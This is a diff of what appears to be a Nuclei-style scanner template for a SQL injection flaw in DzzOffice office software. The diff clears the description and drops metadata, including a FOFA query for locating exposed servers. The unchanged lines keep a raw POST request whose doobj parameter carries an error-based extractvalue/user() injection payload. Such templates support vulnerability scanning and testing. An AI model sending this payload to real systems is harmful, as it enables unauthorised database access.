@@ -3,12 +3,8 @@ info:
   name: DzzOffice 办公软件 SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cdwvfka5038gnux1'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cdwvfka5038gnux1
-    fofa: FOFA：icon_hash="-1961736892" && body="立即注册"
 http:
 - raw:
   - 'POST /index.php?mod=explorer&op=dynamic&do=filelist HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Connection: close
-
-
 
 
     doobj='' and extractvalue(1,concat(0x7e,user())) and ''1''=''1&doevent=&uids%5B%5D=1&startdate=&enddate=&disp=&asc=&page=0
